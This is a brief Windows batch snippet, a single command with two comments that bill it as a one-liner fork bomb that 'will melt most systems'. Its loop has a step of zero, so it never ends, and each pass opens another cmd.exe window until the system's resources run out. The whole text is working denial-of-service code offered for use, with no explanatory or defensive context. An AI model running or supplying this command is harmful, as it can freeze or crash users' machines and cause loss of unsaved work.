rem one liner forkbomb that will melt most systems
rem /C instead of /K also works oddly enough
for /L %g in (1,0,10) do ( start /I cmd.exe /K set /A m=m+1 )
